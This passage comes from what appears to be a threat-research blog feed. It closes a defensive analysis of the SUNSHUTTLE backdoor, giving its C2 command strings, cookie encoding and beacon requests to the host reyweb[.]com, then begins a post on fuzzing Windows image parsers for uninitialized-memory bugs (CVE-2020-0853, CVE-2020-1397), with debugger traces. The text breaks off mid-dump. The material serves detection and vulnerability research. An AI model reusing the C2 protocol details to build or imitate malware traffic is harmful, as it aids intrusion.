  the routine “resolve_command”, which parses the response content to
  determine which command should be run. Available commands include
  remotely updating its configuration, file upload and download, and
  arbitrary command execution. </p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/sunshuttle/fig2.png" alt="" />
  <br /> <span class="type-XS">Figure 2: Resolve command graph</span></p>
 <p>The content returned from the C2 after the “main_beaconing” routine
  is Base64 decoded and AES decrypted. A check is performed to ensure
  the decrypted content doesn’t contain the following string:</p>
 <ul> <li>Cp5RTQ31R1</li> </ul>
 <p>As noted, it is likely these strings are unique per sample and
  randomly generated at compilation.</p>
 <p>The decrypted content is parsed for certain unique strings.﻿</p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="312" valign="top"><p>
          <b>Unique string in decrypted response</b></p> </td> <td
        width="312" valign="top"><p>
          <b>Meaning</b></p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>
          <b>zSsP2TSJJm3a</b></p> </td> <td width="312"
          valign="top"><p>Update sleep range — save config</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>
          <b>﻿aQJmWJzXdYK721mGBI3U</b></p> </td> <td width="312"
          valign="top"><p>Update “false requesting” value – save
        config</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>
          <b>﻿W5VYP9Iu2uyHK</b></p> </td> <td width="312"
          valign="top"><p>Update C2 URL and User-agent – save config</p>
      </td> </tr>
    <tr>
      <td width="312" valign="top"><p>
          <b>﻿3487wD9t2OZkvqdwRpqPeE</b></p> </td> <td width="312"
          valign="top"><p>Send current timestamp to C2</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>
          <b>﻿ubFxROBRwfswVRWNjLC</b></p> </td> <td width="312"
          valign="top"><p>Update &quot;activation&quot; timestamp in the
          config — save config</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>
          <b>﻿TMuhGdA9EHY</b></p> </td> <td width="312"
          valign="top"><p>Upload file to C2 if the file exists</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>
          <b>1kG4NaRX83BCMgLo38Bjq</b></p> </td> <td width="312"
          valign="top"><p>Execute command – return “EXECED” if
        successful</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>
          <b>hB0upT6CUmdRaR2KVBvxrJ</b></p> </td> <td width="312"
          valign="top"><p>Execute command – return results/output</p>
      </td> </tr>
    <tr>
      <td width="312" valign="top"><p>
          <b>N/A (other string criteria met)</b></p> </td> <td
        width="312" valign="top"><p>Provides terminal command
        execution</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>
          <b>N/A (other string criteria met)</b></p> </td> <td
        width="312" valign="top"><p>Download file from C2</p> </td> </tr></tbody></table>
 <h4>Files Dropped</h4>
 <p>After successful execution of the malware, it drops the following
  files to the victim’s system:</p>
 <ul> <li>&lt;current_directory&gt;\config.dat.tmp (MD5: Dynamic)<ul>
        <li>Encrypted configuration file</li> </ul> </li> </ul>
 <h4>Persistence Method</h4>
 <p>The SUNSHUTTLE malware was not observed setting its own persistence.
  It is likely the persistence is set outside of the execution of SUNSHUTTLE.</p>
 <h4>Network Communications</h4>
 <p>SUNSHUTTLE uses the cookie header to pass values to the C2.
  Additionally, a referrer is selected from the following list,
  presumably to make the traffic blend in if traffic is being decrypted
  for inspection:</p>
 <ul> <li>www.bing.com</li> <li>www.yahoo.com</li>
  <li>www.google.com</li> <li>www.facebook.com</li> </ul>
 <p>The cookie headers vary slightly depending on the operation being
  performed. The following is an example request to the C2 from the
  “request_session_key” routine.</p>
 <p style="margin-left: 40.0px;">
  <b>
    <u>Victim to C2<br />  </u></b>GET /assets/index.php HTTP/1.1<br />
  Host: reyweb[.]com<br /> User-Agent: Mozilla/5.0 (Windows NT 10.0;
  Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0<br /> Cookie:
  HjELmFxKJc=48b9e25491e088a35105274cae0b9e67; P5hCrabkKf=gZLXIeKI;
  iN678zYrXMJZ=i4zICToyI70Yeidf1f7rWjm5foKX2Usx; b7XCoFSvs1YRW=78<br />
  Referer: www.facebook.com<br /> Accept-Encoding: gzip</p>
 <p>Within the Cookie header, these values represent the following:</p>
 <ul> <li>
    <b>HjELmFxKJc=48b9e25491e088a35105274cae0b9e67</b>
    <ul> <li>Timestamp MD5 contained within the configuration</li> </ul>
  </li> <li>
    <b>P5hCrabkKf=gZLXIeKI</b>
    <ul> <li>“P5hCrabkKf=” contains a unique string based on which
        routine is performing the request (see the following
      table).</li> </ul> </li> <li>
    <b>iN678zYrXMJZ=i4zICToyI70Yeidf1f7rWjm5foKX2Usx</b>
    <ul> <li>“i4zICToyI70Yeidf1f7rWjm5foKX2Usx” is hard coded within the
        SUNSHUTTLE backdoor. It possibly represents a payload
      identifier</li> </ul> </li> <li>
    <b>b7XCoFSvs1YRW=78</b>
    <ul> <li>Unknown purpose. This value is only included in
        request_session_key and retrieve_session_key requests.</li>
    </ul> </li> </ul>
 <p>As mentioned, the cookie value “P5hCrabkKf=” contained in each
  request signifies the operation that is being performed.</p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td valign="top"><p>
          <b>“P5hCrabkKf=” Cookie Value</b></p> </td> <td valign="top"><p>
          <b>Meaning</b></p> </td> </tr>
    <tr>
      <td valign="top"><p>
          <b>gZLXIeK</b></p> </td> <td
        valign="top"><p>main_request_session_key</p> </td> </tr>
    <tr>
      <td valign="top"><p>
          <b>do1KiqzhQ</b></p> </td> <td
        valign="top"><p>main_clean_file</p> </td> </tr>
    <tr>
      <td valign="top"><p>
          <b>t5UITQ2PdFg5</b></p> </td> <td
        valign="top"><p>main_wget_file</p> </td> </tr>
    <tr>
      <td valign="top"><p>
          <b>cIHiqD5p4da6OeB</b></p> </td> <td
        valign="top"><p>main_retrieve_session_key</p> </td> </tr>
    <tr>
      <td valign="top"><p>
          <b>xpjQVt3bJzWuv</b></p> </td> <td
        valign="top"><p>main_send_file_part</p> </td> </tr>
    <tr>
      <td valign="top"><p>
          <b>S4rgG1WifHU</b></p> </td> <td
        valign="top"><p>main_send_command_result</p> </td> </tr></tbody></table>
 <p>After successful installation / initialization of the malware, it
  proceeds to make the following callback to the C2 server reyweb[.]com
  via TCP/443 HTTPS:</p>
 <p style="margin-left: 40.0px;">
  <b>
    <u>Victim to C2<br />  </u></b>GET /assets/index.php HTTP/1.1<br />
  Host: reyweb[.]com<br /> User-Agent: Mozilla/5.0 (Windows NT 10.0;
  Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0<br /> Cookie:
  HjELmFxKJc=48b9e25491e088a35105274cae0b9e67; P5hCrabkKf=gZLXIeKI;
  iN678zYrXMJZ=i4zICToyI70Yeidf1f7rWjm5foKX2Usx; b7XCoFSvs1YRW=78<br />
  Referer: www.facebook.com<br /> Accept-Encoding: gzip  </p>
 <p style="margin-left: 40.0px;">
  <b>
    <u>Victim to C2<br />  </u></b>GET /assets/index.php HTTP/1.1<br />
  Host: reyweb[.]com<br /> User-Agent: Mozilla/5.0 (Windows NT 10.0;
  Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0<br /> Cookie:
  HjELmFxKJc=48b9e25491e088a35105274cae0b9e67; P5hCrabkKf=gZLXIeKI;
  iN678zYrXMJZ=i4zICToyI70Yeidf1f7rWjm5foKX2Usx; b7XCoFSvs1YRW=78<br />
  Referer: www.yahoo.com<br /> Accept-Encoding: gzip</p>
 <p>Additionally, if the “fake_requesting” configuration value is set to
  1, SUNSHUTTLE will generate traffic meant to blend in with real
  traffic. Examples of those requests are as follows:</p>
 <p style="margin-left: 40.0px;">
  <b>
    <u>Victim to C2<br />  </u></b>GET /icon.png HTTP/1.1<br /> Host:
  reyweb[.]com<br /> User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64;
  x64; rv:75.0) Gecko/20100101 Firefox/75.0<br /> Referer:
  www.google.com<br /> Accept-Encoding: gzip</p>
 <p style="margin-left: 40.0px;">
  <b>
    <u>Victim to C2<br />  </u></b>GET /css/style.css HTTP/1.1<br />
  Host: reyweb[.]com<br /> User-Agent: Mozilla/5.0 (Windows NT 10.0;
  Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0<br /> Referer:
  www.facebook.com<br /> Accept-Encoding: gzip</p>
 <p style="margin-left: 40.0px;">
  <b>
    <u>Victim to C2<br />  </u></b>GET /css/bootstrap.css HTTP/1.1<br />
  Host: reyweb[.]com<br /> User-Agent: Mozilla/5.0 (Windows NT 10.0;
  Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0<br /> Referer:
  www.facebook.com<br /> Accept-Encoding: gzip</p>
 <p style="margin-left: 40.0px;">
  <b>
    <u>Victim to Legitimate<br />  </u></b>GET / HTTP/1.1<br /> Host:
  cdn.cloudflare[.]com<br /> User-Agent: Mozilla/5.0 (Windows NT 10.0;
  Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0<br /> Referer:
  www.google.com<br /> Accept-Encoding: gzip</p>
 <h4>Appendix: MITRE ATT&amp;CK Framework</h4>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td valign="top"><p>
          <b>Technique</b></p> </td> <td valign="top"><p>
          <b>Description</b></p> </td> </tr>
    <tr>
      <td valign="top"><p>
          <b>T1027</b></p> </td> <td valign="top"><p>Obfuscated Files or
        Information</p> </td> </tr>
    <tr>
      <td valign="top"><p>
          <b>T1027.002</b></p> </td> <td valign="top"><p>Software
        Packing</p> </td> </tr>
    <tr>
      <td valign="top"><p>
          <b>T1059.003</b></p> </td> <td valign="top"><p>Windows Command
        Shell</p> </td> </tr>
    <tr>
      <td valign="top"><p>
          <b>T1071.001</b></p> </td> <td valign="top"><p>Web
        Protocols</p> </td> </tr>
    <tr>
      <td valign="top"><p>
          <b>T1105</b></p> </td> <td valign="top"><p>Ingress Tool
        Transfer</p> </td> </tr>
    <tr>
      <td valign="top"><p>
          <b>T1140</b></p> </td> <td valign="top"><p>Deobfuscate/Decode
          Files or Information</p> </td> </tr>
    <tr>
      <td valign="top"><p>
          <b>T1573.001</b></p> </td> <td valign="top"><p>Symmetric
        Cryptography</p> </td> </tr></tbody></table>
 <h4>Appendix: Detecting the Techniques</h4>
 <p>FireEye security solutions provide detection of the SUNSHUTTLE
  activity across email, endpoint and network levels. The following is a
  snapshot of existing detections related to activity outlined in this
  blog post.</p>
 <table border="1" cellspacing="0" cellpadding="0" width="624"> <tbody>
    <tr>
      <td width="210" valign="top"><p>
          <b>Platform(s)</b></p> </td> <td width="414" valign="top"><p>
          <b>Detection Name</b></p> </td> </tr>
    <tr>
      <td width="210" valign="top"><ul> <li>Network Security</li>
            <li>Email Security</li> <li>Detection On Demand</li>
            <li>Malware File Scanning</li> <li>Malware File Storage
          Scanning</li> </ul> </td> <td width="414" valign="top"><ul>
          <li>FE_APT_Backdoor_Win64_SUNSHUTTLE_1</li>
          <li>FE_APT_Backdoor_Win_SUNSHUTTLE_1</li>
          <li>APT.Backdoor.Win.SUNSHUTTLE</li>
          <li>APT.Backdoor.Win.SUNSHUTTLE.MVX</li> </ul> </td> </tr>
    <tr>
      <td width="210" valign="top"><p>Endpoint Security</p> </td> <td
        width="414" valign="top"><p>
          <b>Malware Protection (AV/MG)</b></p> <ul>
          <li>Trojan.GenericKD.34453763</li>
          <li>Generic.mg.9466c865f7498a35</li> </ul> </td> </tr></tbody></table>
http://www.fireeye.com/blog/threat-research/2021/03/sunshuttle-second-stage-backdoor-targeting-us-based-entity.html2021-03-04T17:00:00.000Z2021-03-05T01:54:41.515ZFuzzing Image Parsing in Windows, Part Two: Uninitialized Memorynoemail@noemail.orgDhanesh Kizhakkinan<p>Continuing our discussion of <a
    href="/content/fireeye-www/en_US/blog/threat-research/2020/09/fuzzing-image-parsing-in-windows-color-profiles.html">image
    parsing vulnerabilities in Windows</a>, we take a look at a
  comparatively less popular vulnerability class: uninitialized memory.
  In this post, we will look at Windows’ inbuilt image
  parsers—specifically for vulnerabilities involving the use of
  uninitialized memory.</p>
 <h4>The Vulnerability: Uninitialized Memory</h4>
 <p>In unmanaged languages, such as C or C++, variables are not
  initialized by default. Using uninitialized variables causes undefined
  behavior and may cause a crash. There are roughly two variants of
  uninitialized memory:</p>
 <ul> <li>Direct uninitialized memory usage: An uninitialized pointer or
    an index is used in read or write. This may cause a crash.</li>
    <li>Information leakage (info leak) through usage of uninitialized
    memory: Uninitialized memory content is accessible across a security
    boundary. An example: an uninitialized kernel buffer accessible from
    user mode, leading to information disclosure.</li> </ul>
 <p>In this post we will be looking closely at the second variant in
  Windows image parsers, which will lead to information disclosure in
  situations such as web browsers where an attacker can read the decoded
  image back using JavaScript.</p>
 <h4>Detecting Uninitialized Memory Vulnerabilities</h4>
 <p>Compared to memory corruption vulnerabilities such as heap overflow
  and use-after-free, uninitialized memory vulnerabilities on their own
  do not access memory out of bound or out of scope. This makes
  detection of these vulnerabilities slightly more complicated than
  memory corruption vulnerabilities. While direct uninitialized memory
  usage can cause a crash and can be detected, information leakage
  doesn’t usually cause any crashes. Detecting it requires compiler
  instrumentations such as MemorySanitizer or binary
  instrumentation/recompilation tools such as Valgrind.</p>
 <h4>Detour: Detecting Uninitialized Memory in Linux</h4>
 <p>Let's take a little detour and look at detecting uninitialized
  memory in Linux and compare with Windows’ built-in capabilities. Even
  though compilers warn about some uninitialized variables, most of the
  complicated cases of uninitialized memory usage are not detected at
  compile time. For this, we can use a run-time detection mechanism.
  MemorySanitizer is a compiler instrumentation for both GCC and Clang,
  which detects uninitialized memory reads. A sample of how it works is
  given in Figure 1.</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><p>
          <span class="code">$ cat sample.cc<br />  #include
        &lt;stdio.h&gt;</span></p> <p>
          <span class="code">int main()<br />  {<br />      int *arr =
            new int[10];<br />      if(arr[3] == 0)<br />      {<br />
                     printf(&quot;Yay!\n&quot;);<br />      }<br />     
            printf(&quot;%08x\n&quot;, arr[3]);<br />      return
            0;<br />  }</span></p> <p>
          <span class="code">$ clang++ -fsanitize=memory
            -fno-omit-frame-pointer -g sample.cc</span></p> <p>
          <span class="code">$ ./a.out<br />  ==29745==WARNING:
            MemorySanitizer: use-of-uninitialized-value<br />      #0
            0x496db8  (/home/dan/uni/a.out+0x496db8)<br />      #1
            0x7f463c5f1bf6 
            (/lib/x86_64-linux-gnu/libc.so.6+0x21bf6)<br />      #2
            0x41ad69  (/home/dan/uni/a.out+0x41ad69)</span></p> <p>
          <span class="code">SUMMARY: MemorySanitizer:
            use-of-uninitialized-value
            (/home/dan/uni/a.out+0x496db8)<br />  Exiting</span></p>
      </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 1: MemorySanitizer detection of
    uninitialized memory</span></p>
 <p>Similarly, Valgrind can also be used to detect uninitialized memory
  during run-time.</p>
 <h4>Detecting Uninitialized Memory in Windows</h4>
 <p>Compared to Linux, Windows lacks any built-in mechanism for
  detecting uninitialized memory usage. While Visual Studio and Clang-cl
  recently introduced <a
    href="https://devblogs.microsoft.com/cppblog/addresssanitizer-asan-for-windows-with-msvc/">AddressSanitizer
  support</a>, MemorySanitizer and other sanitizers are not implemented
  as of this writing.</p>
 <p>Some of the useful tools in Windows to detect memory corruption
  vulnerabilities such as <a
  href="https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/gflags-and-pageheap">PageHeap</a>
  do not help in detecting uninitialized memory. On the contrary,
  PageHeap fills the memory allocations with patterns, which essentially
  makes them initialized.</p>
 <p>There are few third-party tools, including Dr.Memory, that use
  binary instrumentation to detect memory safety issues such as heap
  overflows, uninitialized memory usages, use-after-frees, and others.</p>
 <h4>Detecting Uninitialized Memory in Image Decoding</h4>
 <p>Detecting uninitialized memory in Windows usually requires binary
  instrumentation, especially when we do not have access to source code.
  One of the indicators we can use to detect uninitialized memory usage,
  specifically in the case of image decoding, is the resulting pixels
  after the image is decoded.</p>
 <p>When an image is decoded, it results in a set of raw pixels. If
  image decoding uses any uninitialized memory, some or all of the
  pixels may end up as random. In simpler words, decoding an image
  multiple times may result in different output each time if
  uninitialized memory is used. This difference of output can be used to
  detect uninitialized memory and aid writing a fuzzing harness
  targeting Windows image decoders. An example fuzzing harness is
  presented in Figure 2.</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><p>
          <span class="code">#define ROUNDS 20</span></p> <p>
          <span class="code">unsigned char* DecodeImage(char
            *imagePath)<br />  {<br />        unsigned char *pixels =
            NULL;     </span></p> <p>
          <span class="code">      // use GDI or WIC to decode image and
            get the resulting pixels<br />        ...<br />        ... 
               </span></p> <p>
          <span class="code">      return pixels;<br />  }</span></p> <p>
          <span class="code">void Fuzz(char *imagePath)<br />  {<br />
                  unsigned char *refPixels = DecodeImage(imagePath);   
         </span></p> <p>
          <span class="code">      if(refPixels != NULL)<br />       
            {<br />              for(int i = 0; i &lt; ROUNDS;
            i++)<br />              {<br />                    unsigned
            char *currPixels = DecodeImage(imagePath);<br />           
                    if(!ComparePixels(refPixels, currPixels))<br />     
                          {<br />                          // the
            reference pixels and current pixels don't match<br />       
                              // crash now to let the fuzzer know of
            this file<br />                         
            CrashProgram();<br />                    }<br />           
                    free(currPixels);<br />              }<br />       
                  free(refPixels);<br />        }<br />  }</span></p>
      </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 2: Diff harness</span></p>
 <p>The idea behind this fuzzing harness is not entirely new;
  previously, <a
  href="https://lcamtuf.blogspot.com/2014/09/cve-2014-1564-uninitialized-memory-when.html">lcamtuf</a>
  used a similar idea to detect uninitialized memory in open-source
  image parsers and used a web page to display the pixel differences.</p>
 <h4>Fuzzing</h4>
 <p>With the diffing harness ready, one can proceed to look for the
  supported image formats and gather corpuses. Gathering image files for
  corpus is considerably easy given the near unlimited availability on
  the internet, but at the same time it is harder to find good corpuses
  among millions of files with unique code coverage. Code coverage
  information for Windows image parsing is tracked from WindowsCodecs.dll.</p>
 <p>Note that unlike regular Windows fuzzing, we will not be enabling
  PageHeap this time as PageHeap “initializes” the heap allocations with patterns.</p>
 <h4>Results</h4>
 <p>During my research, I found three cases of uninitialized memory
  usage while fuzzing Windows built-in image parsers. Two of them are
  explained in detail in the next sections. Root cause analysis of
  uninitialized memory usage is non-trivial. We don’t have a crash
  location to back trace, and have to use the resulting pixel buffer to
  back trace to find the root cause—or use clever tricks to find the deviation.</p>
 <h3>CVE-2020-0853</h3>
 <p>Let’s look at the rendering of the proof of concept (PoC) file
  before going into the root cause of this vulnerability. For this we
  will use lcamtuf’s HTML, which loads the PoC image multiple times and
  compares the pixels with reference pixels.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/fuzzing-image2/fig3.png" alt="" />
  <br /> <span class="type-XS">Figure 3: CVE-2020-0853</span></p>
 <p>As we can see from the resulting images (Figure 3), the output
  varies drastically in each decoding and we can assume this PoC leaks a
  lot of uninitialized memory.</p>
 <p>To identify the root cause of these vulnerabilities, I used Time
  Travel Debugging (TTD) extensively. Tracing back the execution and
  keeping track of the memory address is a tedious task, but TTD makes
  it only slightly less painful by keeping the addresses and values
  constant and providing unlimited forward and backward executions. </p>
 <p>After spending quite a bit of time debugging the trace, I found the
  source of uninitialized memory in <span
  class="code">windowscodecs!CFormatConverter::Initialize</span>. Even
  though the source was found, it was not initially clear why this
  memory ends up in the calculation of pixels without getting
  overwritten at all. To solve this mystery, additional debugging was
  done by comparing PoC execution trace against a normal TIFF file
  decoding. The following section shows the allocation, copying of
  uninitialized value to pixel calculation and the actual root cause of
  the vulnerability.</p>
 <h4>Allocation and Use of Uninitialized Memory</h4>
 <p>
  <span class="code">windowscodecs!CFormatConverter::Initialize</span>
  allocates 0x40 bytes of memory, as shown in Figure 4.</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><p>
          <span class="code">0:000&gt; r<br />  rax=0000000000000000
            rbx=0000000000000040 rcx=0000000000000040<br />
            rdx=0000000000000008 rsi=000002257a3db448
            rdi=0000000000000000<br />  rip=00007ffaf047a238
            rsp=000000ad23f6f7c0 rbp=000000ad23f6f841<br />
             r8=000000ad23f6f890  r9=0000000000000010
            r10=000002257a3db468<br />  r11=000000ad23f6f940
            r12=000000000000000e r13=000002257a3db040<br />
            r14=000002257a3dbf60 r15=0000000000000000<br />
            iopl=0         nv up ei pl zr na po nc<br />  cs=0033 
            ss=002b  ds=002b  es=002b  fs=0053  gs=002b            
            efl=00000246<br />
            windowscodecs!CFormatConverter::Initialize+0x1c8:<br />
            00007ffa`f047a238 ff15ea081200    call    qword ptr
            [windowscodecs!_imp_malloc (00007ffa`f059ab28)]
            ds:00007ffa`f059ab28={msvcrt!malloc
            (00007ffa`f70e9d30)}<br />  0:000&gt; k<br />   #
            Child-SP          RetAddr               Call Site<br />  00
            000000ad`23f6f7c0 00007ffa`f047c5fb    
            windowscodecs!CFormatConverter::Initialize+0x1c8<br />  01
            000000ad`23f6f890 00007ffa`f047c2f3    
            windowscodecs!CFormatConverter::Initialize+0x12b<br />  02
            000000ad`23f6f980 00007ff6`34ca6dff    
        windowscodecs!CFormatConverterResolver::Initialize+0x273</span></p> <p>
          <span class="code">//<b>Uninitialized memory after
            allocation</b>:<br />  0:000&gt; db @rax<br />
            00000225`7a3dbf70  d0 b0 3d 7a 25 02 00 00-60 24 3d 7a 25 02
            00 00  ..=z%...`$=z%...<br />  00000225`7a3dbf80  00 00 00
            00 00 00 00 00-00 00 00 00 00 00 00 00 
            ................<br />  00000225`7a3dbf90  00 00 00 00 00 00
            00 00-00 00 00 00 00 00 00 00  ................<br />
            00000225`7a3dbfa0  00 00 00 00 00 00 00 00-00 00 00 00 00 00
            00 00  ................<br />  00000225`7a3dbfb0  00 00 00
            00 00 00 00 00-00 00 00 00 00 00 00 00 
            ................<br />  00000225`7a3dbfc0  00 00 00 00 00 00
            00 00-64 51 7c 26 c3 2c 01 03  ........dQ|&amp;.,..<br />
            00000225`7a3dbfd0  f0 00 2f 6b 25 02 00 00-f0 00 2f 6b 25 02
            00 00  ../k%...../k%...<br />  00000225`7a3dbfe0  60 00 3d
            7a 25 02 00 00-60 00 3d 7a 25 02 00 00 
        `.=z%...`.=z%...</span></p> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 4: Allocation of memory</span></p>
 <p>The memory never gets written and the uninitialized values are
  inverted in <span
  class="code">windowscodecs!CLibTiffDecoderBase::HrProcessCopy</span>
  and further processed in <span
  class="code">windowscodecs!GammaConvert_16bppGrayInt_128bppRGBA</span>
  and in later called scaling functions.</p>
 <p>As there is no read or write into uninitialized memory before
  HrProcessCopy, I traced the execution back from HrProcessCopy and
  compared the execution traces with a normal tiff decoding trace. A
  difference was found in the way <span
  class="code">windowscodecs!CLibTiffDecoderBase::UnpackLine</span>
  behaved with the PoC file compared to a normal TIFF file, and one of
  the function parameters in <span class="code">UnpackLine</span> was a
  pointer to the uninitialized buffer.</p>
 <p>The <span class="code">UnpackLine</span> function has a series of
  switch-case statements working with bits per sample (BPS) of TIFF
  images. In our PoC TIFF file, the BPS value is 0x09—which is not
  supported by <span class="code">UnpackLine</span>—and the control flow
  never reaches a code path that writes to the buffer. This is the root
  cause of the uninitialized memory, which gets processed further down
  the pipeline and finally shown as pixel data.</p>
 <h4>Patch</h4>
 <p>After presenting my analysis to Microsoft, they decided to patch the
  vulnerability by making the files with unsupported BPS values as
  invalid. This avoids all decoding and rejects the file in the very
  early phase of its loading.</p>
 <h4>CVE-2020-1397</h4>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/fuzzing-image2/fig5.png" alt="" />
  <br /> <span class="type-XS">Figure 5: Rendering of CVE-2020-1397</span></p>
 <p>Unlike the previous vulnerability, the difference in the output is
  quite limited in this one, as seen in Figure 5. One of the simpler
  root cause analysis techniques that can be used to figure out a
  specific type of uninitialized memory usage is comparing execution
  traces of runs that produce two different outputs. This specific
  technique can be helpful when an uninitialized variable causes a
  control flow change in the program and that causes a difference in the
  outputs. For this, a binary instrumentation script was written, which
  logged all the instructions executed along with its registers and
  accessed memory values.</p>
 <p>Diffing two distinct execution traces by comparing the instruction
  pointer (RIP) value, I found a control flow change in <span
  class="code">windowscodecs!CCCITT::Expand2DLine</span> due to a usage
  of an uninitialized value. Back tracing the uninitialized value using
  TTD trace was exceptionally useful for finding the root cause. The
  following section shows the allocation, population and use of the
  uninitialized value, which leads to the control flow change and
  deviance in the pixel outputs.</p>
 <h4>Allocation</h4>
 <p>
  <span class="code">windowscodecs!TIFFReadBufferSetup</span> allocates
  0x400 bytes of memory, as shown in Figure 6.</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><p>
          <span class="code">windowscodecs!TIFFReadBufferSetup:<br />   
              ...<br />      allocBuff = malloc(size);<br />      *(v3 +
            16) |= 0x200u;<br />      *(v3 + 480) =
        allocBuff;</span></p> <p>
          <span class="code">0:000&gt; k<br />   # Child-SP         
            RetAddr           Call Site<br />  00 000000aa`a654f128
            00007ff9`4404d4f3 windowscodecs!TIFFReadBufferSetup<br />
            01 000000aa`a654f130 00007ff9`4404d3c9
            windowscodecs!TIFFFillStrip+0xab<br />  02 000000aa`a654f170
            00007ff9`4404d2dc
            windowscodecs!TIFFReadEncodedStrip+0x91<br />  03
            000000aa`a654f1b0 00007ff9`440396dd
            windowscodecs!CLibTiffDecoderBase::ReadStrip+0x74<br />  04
            000000aa`a654f1e0 00007ff9`44115fca
            windowscodecs!CLibTiffDecoderBase::GetOneUnpackedLine+0x1ad<br />
            05 000000aa`a654f2b0 00007ff9`44077400
            windowscodecs!CLibTiffDecoderBase::HrProcessCopy+0x4a<br />
            06 000000aa`a654f2f0 00007ff9`44048dbb
            windowscodecs!CLibTiffDecoderBase::HrReadScanline+0x20<br />
            07 000000aa`a654f320 00007ff9`44048b40
            windowscodecs!CDecoderBase::CopyPixels+0x23b<br />  08
            000000aa`a654f3d0 00007ff9`44043c95
            windowscodecs!CLibTiffDecoderBase::CopyPixels+0x80<br />  09
            000000aa`a654f4d0 00007ff9`4404563b
        windowscodecs!CDecoderFrame::CopyPixels+0xb5</span></p> <p>
          <span class="code"> </span></p> <p>
          <span class="code">After allocation:<br />  0:000&gt; !heap -p
            -a @rax<br />      address 0000029744382140 found in<br />
                _HEAP @ 29735190000<br />                HEAP_ENTRY Size
            Prev Flags            UserPtr UserSize - state<br />       
              0000029744382130 0041 0000  [00]   0000029744382140   
            00400 - (busy)<br />            unknown!noop</span></p> <p>
          <span class="code">//<b>Uninitialized memory after
            allocation </b>       <br />  0:000&gt; db @rax<br />
            00000297`44382140  40 7c 5e 97 29 5d 5f ae-73 31 98 70 b8 4f
            da ac  @|^.)]_.s1.p.O..<br />  00000297`44382150  06 51 54
            18 2e 2a 23 3a-4f ab 14 27 e9 c6 2c 83 
            .QT..*#:O..'..,.<br />  00000297`44382160  3a 25 b2 f6 9d e7
            3c 09-cc a5 8e 27 b0 73 41 a9  :%....&lt;....'.sA.<br />
            00000297`44382170  fb 9b 02 b5 81 3e ea 45-4c 0f ab a7 72 e3
            21 e7  .....&gt;.EL...r.!.<br />  00000297`44382180  c8 44
            84 3b c3 b5 44 8a-c9 6e 4b 2e 40 31 38 e0 
            .D.;..D..nK.@18.<br />  00000297`44382190  85 f0 bd 98 3b 0b
            ca b8-78 b1 9d d0 dd 4d 61 66  ....;...x....Maf<br />
            00000297`443821a0  16 7d 0a e2 40 fa f8 45-4f 79 ab 95 d8 54
            f9 44  .}..@..EOy...T.D<br />  00000297`443821b0  66 26 28
            00 b7 96 52 88-15 f0 ed 34 94 5f 6f 94 
        f&amp;(...R....4._o.</span></p> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 6: Allocation of memory</span></p>
 <h4>Partially Populating the Buffer</h4>
 <p>0x10 bytes are copied from the input file to this allocated buffer
  by TIFFReadRawStrip1. The rest of the buffer remains uninitialized
  with random values, as shown in Figure 7.</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><p>
          <span class="code">if ( !TIFFReadBufferSetup(v2, a2,
            stripCount) ) {<br />        return 0i64;<br />  }<br />  if
            ( TIFFReadRawStrip1(v2, v3, sizeToReadFromFile,
            &quot;TIFFFillStrip&quot;) != sizeToReadFromFile
        )</span></p> <p>
          <span class="code"> </span></p> <p>
          <span class="code">0:000&gt; r<br />  rax=0000000000000001
            rbx=000002973519a7e0 rcx=000002973519a7e0<br />
            rdx=0000000000000000 rsi=0000000000000000
            rdi=0000000000000010<br />  rip=00007ff94404d58c
            rsp=000000aaa654f128 rbp=0000000000000000<br />
             r8=0000000000000010  r9=00007ff94416fc38
            r10=0000000000000000<br />  r11=000000aaa654ef60
            r12=0000000000000001 r13=0000000000000000<br />
            r14=0000029744377de0 r15=0000000000000001<br />
            iopl=0         nv up ei pl nz na pe nc<br />  cs=0033 
            ss=002b  ds=002b  es=002b  fs=0053  gs=002b            
            efl=00000202<br />  windowscodecs!TIFFReadRawStrip1:<br />
            00007ff9`4404d58c 488bc4          mov     rax,rsp<br />
            0:000&gt; k<br />   # Child-SP          RetAddr          
            Call Site<br />  00 000000aa`a654f128 00007ff9`4404d491
            windowscodecs!TIFFReadRawStrip1<br />  01 000000aa`a654f130
            00007ff9`4404d3c9 windowscodecs!TIFFFillStrip+0x49<br />  02
            000000aa`a654f170 00007ff9`4404d2dc
            windowscodecs!TIFFReadEncodedStrip+0x91<br />  03
            000000aa`a654f1b0 00007ff9`440396dd
            windowscodecs!CLibTiffDecoderBase::ReadStrip+0x74<br />  04
            000000aa`a654f1e0 00007ff9`44115fca
            windowscodecs!CLibTiffDecoderBase::GetOneUnpackedLine+0x1ad<br />
            05 000000aa`a654f2b0 00007ff9`44077400
